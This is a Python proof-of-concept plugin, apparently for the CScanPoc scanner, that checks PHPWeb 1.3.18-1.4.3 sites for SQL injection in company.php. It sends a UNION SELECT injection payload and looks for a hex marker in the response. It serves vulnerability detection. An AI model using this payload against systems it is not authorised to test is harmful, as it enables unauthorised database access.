# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'PHPWeb_0001' # 平台漏洞编号，留空
    name = 'PHPWeb 1.3.18-1.4.3 /company.php SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-10-20'  # 漏洞公布时间
    desc = '''
        PHPWeb /page/html/company.php?id= SQL注入漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'PHPWeb'  # 漏洞应用名称
    product_version = '1.3.18-1.4.3'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '4df7abe5-b4cb-459e-a5c0-fde4af56d3fa'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = ("/page/html/company.php?id=1'%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(0x7176707a71,"
                      "0x4e5172484a7361735357,0x71787a6a71),NULL,NULL,NULL,NULL,NULL,NULL#")
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()

            if '4e5172484a7361735357' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
